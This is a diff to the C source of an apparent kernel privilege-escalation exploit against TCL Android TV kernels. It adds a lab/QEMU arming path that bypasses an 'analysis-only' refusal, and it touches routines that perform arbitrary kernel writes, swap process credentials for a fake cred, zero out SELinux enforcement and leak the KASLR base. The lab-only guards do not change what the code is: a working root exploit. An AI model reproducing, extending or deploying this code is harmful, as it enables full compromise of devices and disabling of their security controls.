@@ -105,6 +105,8 @@ static int print_profile_info(const char *release_override) {
     reclaim_route = "tcl-v643-exact";
   else if (profile->reclaim_route == GHOST_RECLAIM_TCL_V65X_UNPROVEN)
     reclaim_route = "tcl-v65x-unproven";
+  else if (profile->reclaim_route == GHOST_RECLAIM_TCL_V65X_EXACT)
+    reclaim_route = "tcl-v65x-exact";
   printf("reclaim_route=%s\n", reclaim_route);
   printf("analysis_blocker=%s\n",
          profile->analysis_blocker ? profile->analysis_blocker : "");
@@ -142,24 +144,55 @@ static int select_offsets(void) {
   const char *lab_release = getenv("TCL_V643_LAB_RELEASE");
   if (lab_release && lab_release[0]) profile_release = lab_release;
 #endif
-  const struct kernel_offsets *candidate = find_offsets_for_release(profile_release);
+#if defined(TCL_V65X_QEMU_MODEL_ARMING) && TCL_V65X_QEMU_MODEL_ARMING
+  const char *v65x_model_release = getenv("TCL_V65X_QEMU_MODEL_RELEASE");
+  if (v65x_model_release && v65x_model_release[0])
+    profile_release = v65x_model_release;
+#endif
+  const struct kernel_offsets *candidate =
+      find_offsets_for_release(profile_release);
   if (candidate) {
       if (candidate->analysis_only) {
+        int lab_accepted = 0;
 #if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
         if (candidate->stack_overlay_route ==
                 GHOST_STACK_OVERLAY_TCL_V643_NEWSELECT_COMPAT &&
             candidate->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT) {
+          lab_accepted = 1;
           pr_warning("LAB ARMING: accepting integrated TCL V643 profile; "
                      "this build must not be run on the TV before the "
                      "uninstrumented QEMU gate passes\n");
-        } else
+        }
 #endif
-        {
-        pr_error("profile is analysis-only: %s\n",
-                 candidate->analysis_blocker ? candidate->analysis_blocker :
-                 "required values are not proven");
-        pr_error("refusing to arm any kernel primitive\n");
-        return -1;
+#if defined(TCL_V65X_QEMU_MODEL_ARMING) && TCL_V65X_QEMU_MODEL_ARMING
+        static struct kernel_offsets v65x_qemu_model;
+        if (candidate->stack_overlay_route ==
+                GHOST_STACK_OVERLAY_TCL_V65X_NEWSELECT_COMPAT &&
+            candidate->reclaim_route == GHOST_RECLAIM_TCL_V65X_UNPROVEN) {
+          /* This device exists only in the source-built disposable kernel.
+           * Checking it before changing the route prevents this laboratory
+           * binary from arming on Android, even if copied there by mistake. */
+          if (access("/dev/glqemu-root", F_OK) != 0) {
+            pr_error("V65x QEMU model observer is absent; refusing arming\n");
+            return -1;
+          }
+          v65x_qemu_model = *candidate;
+          v65x_qemu_model.analysis_only = 0;
+          v65x_qemu_model.reclaim_route = GHOST_RECLAIM_TCL_V65X_EXACT;
+          v65x_qemu_model.analysis_blocker =
+              "QEMU surrogate only; not hardware validation";
+          candidate = &v65x_qemu_model;
+          lab_accepted = 1;
+          pr_warning("QEMU V65X MODEL ARMING: shared T653T01 chain only; "
+                     "this is not proof for a stock V65x kernel\n");
+        }
+#endif
+        if (!lab_accepted) {
+          pr_error("profile is analysis-only: %s\n",
+                   candidate->analysis_blocker ? candidate->analysis_blocker :
+                   "required values are not proven");
+          pr_error("refusing to arm any kernel primitive\n");
+          return -1;
         }
       }
       active_offsets = candidate;
@@ -875,7 +908,7 @@ static int tcl_create_shared(struct tcl_v643_mcast_shared **out, int *out_fd) {
   return 1;
 }
 
-static int run_tcl_v643_split_route(void) {
+static int run_tcl_split_newselect_route(void) {
   struct tcl_split_run run = {0};
   pthread_t owner, verifier;
   int fd = -1, status = 0;
@@ -974,9 +1007,9 @@ fail:
 void run_main_route_threads(void) {
   reset_main_route_state();
   if (active_offsets &&
-      active_offsets->stack_overlay_route ==
-          GHOST_STACK_OVERLAY_TCL_V643_NEWSELECT_COMPAT) {
-    if (!run_tcl_v643_split_route()) {
+      ghost_stack_overlay_is_tcl_newselect(
+          active_offsets->stack_overlay_route)) {
+    if (!run_tcl_split_newselect_route()) {
       g_route_write_ok = 0;
       return;
     }
@@ -1189,14 +1222,14 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
     return 0;
   }
   if (mode == 6 && (!active_offsets ||
-      active_offsets->reclaim_route != GHOST_RECLAIM_TCL_V643_EXACT)) {
+      !ghost_reclaim_is_tcl_exact(active_offsets->reclaim_route))) {
     /* Walk 0: cred. Plan: walk 1 targets real_cred (= target - 8). */
     ghost_push_plan(pselect_custom_target - 8, page_base + FAKE_CRED_OFF);
     pr_info("  walk0: cred, walk1: real_cred, fake_cred=%016zx plans=%d\n",
             page_base + FAKE_CRED_OFF, ghost_plan_count());
   }
   if (mode == WRITE_MODE_CRED_SELINUX && (!active_offsets ||
-      active_offsets->reclaim_route != GHOST_RECLAIM_TCL_V643_EXACT)) {
+      !ghost_reclaim_is_tcl_exact(active_offsets->reclaim_route))) {
     /* Plan 0 is baked into the payload by prepare_skb_payload as the
      * selinux zero-write (W0.pi_tree = {pc=(selinux-8)|1, right=0,
      * left=0}). Push the two cred plans for the following overlay
@@ -1876,7 +1909,7 @@ static int perf_leak_init_user_ns(uintptr_t task, uintptr_t *out) {
  * init_cred+cred.user_ns contains canonical &init_user_ns. */
 static uintptr_t runtime_static_symbol_base(void) {
   if (active_offsets &&
-      active_offsets->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT &&
+      ghost_reclaim_is_tcl_exact(active_offsets->reclaim_route) &&
       active_offsets->kimage_text_base)
     return active_offsets->kimage_text_base;
   return kaslr_base;
@@ -2918,7 +2951,7 @@ static int run_cred_swap(void) {
   set_limit();
   if (!active_offsets && select_offsets() < 0) return 1;
   if (active_offsets &&
-      active_offsets->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT &&
+      ghost_reclaim_is_tcl_exact(active_offsets->reclaim_route) &&
       !direct_handoff_enabled) {
     pr_error("TCL production root is fail-closed without a direct handoff; "
              "raw-root exec is forbidden\n");
@@ -3440,8 +3473,8 @@ static int run_cred_swap(void) {
      * table.  Only then does W1 open the bounded permissive window.  Thus a
      * W2 failure cannot leave SELinux permissive; after any possible W1
      * landing, only policy reload + verification or reboot may close it. */
-    if (selinux_mode && active_offsets->reclaim_route ==
-                            GHOST_RECLAIM_TCL_V643_EXACT) {
+    if (selinux_mode &&
+        ghost_reclaim_is_tcl_exact(active_offsets->reclaim_route)) {
       if (root_victim_pid >= 0) {
         pr_error("TCL safe handoff does not retry reclaim with a live raw "
                  "victim; reboot is the cleanup boundary\n");
